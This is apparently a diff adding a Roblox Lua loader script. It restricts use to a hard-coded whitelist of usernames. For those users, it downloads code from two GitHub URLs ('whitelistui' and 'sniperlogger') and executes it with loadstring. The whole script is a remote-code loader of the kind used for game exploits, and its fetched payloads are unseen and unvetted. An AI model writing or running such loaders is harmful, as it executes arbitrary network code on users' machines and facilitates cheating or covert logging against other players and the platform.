@@ -1,0 +1,13 @@
+local whitelist = { "kiffynianooo", "Vzozz1", "UgcScripterNoob", "IkerRCplus10", "Jzyrelalways", "OmegaReap3r", "pamda0978", "Ahkdan_BloxFruit", "yeeftaMaster28" }
+
+local player = game.Players.LocalPlayer local username = player.Name
+
+local function isWhitelisted(user) for _, name in ipairs(whitelist) do if name == user then return true end end return false end
+
+if not isWhitelisted(username) then game.StarterGui:SetCore("SendNotification", { Title = "Access Denied", Text = "Must Have @Level 10👾", Duration = 5 }) return end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MainTreeUhh/Snipey/refs/heads/main/whitelistui"))()
+
+task.wait()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MainTreeUhh/Snipey/refs/heads/main/sniperlogger"))()
